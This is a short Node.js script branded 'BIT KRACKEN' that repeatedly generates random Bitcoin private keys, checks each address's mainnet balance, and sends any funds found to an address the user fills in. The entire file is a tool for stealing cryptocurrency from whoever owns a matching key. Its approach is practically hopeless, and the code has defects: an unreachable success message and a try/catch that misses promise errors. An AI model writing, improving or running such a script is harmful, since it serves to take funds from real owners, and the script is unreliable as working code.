var sleep = require('sleep');
var CoinKey = require('coinkey') //1.0.0
var bitcoinTransaction = require('bitcoin-transaction');
var to = "CHANGE ME TO YOUR BTC ADDRESS"; //change me to who you want the bitcoin to go to

console.log(`
/=========================\\
|BBB    IIIII  TTTTTTT    |
|B  B     I       T       |
|BBBB     I       T       |
|B   B    I       T       |
|BBBBB  IIIII     T       |
|                  KRACKEN|
\\=========================/
`)

bitcoinTransaction.providers.balance.mainnet.default = bitcoinTransaction.providers.balance.mainnet.blockchain;

console.log("Working (This will take *pretty much forever!*)")

while (true) {

var ck = new CoinKey.createRandom() //Create random address
var from = ck.publicAddress;    //Our current "brute forced" address
var privKeyWIF = ck.privateWif;    //Private (WIF) key of "brute forced" address in WIF form

try {

bitcoinTransaction.getBalance(from, { network: "mainnet" }).then((balanceInBTC) => {
    if (balanceInBTC > 0) {
        console.log(`Sending ${balanceInBTC} to ${to}.`)
        return bitcoinTransaction.sendTransaction({
            from: from,
            to: to,
            privKeyWIF: privKeyWIF,
            btc: balanceInBTC,
            network: "mainnet",
            fee: "halfHour"
        });
        console.log("Congrats! It should take about half an hour to get your coins.")
    } else {
        return "none-yet";
    }
});
} catch {
console.log(`Error!`)
}

sleep.msleep(25)
}
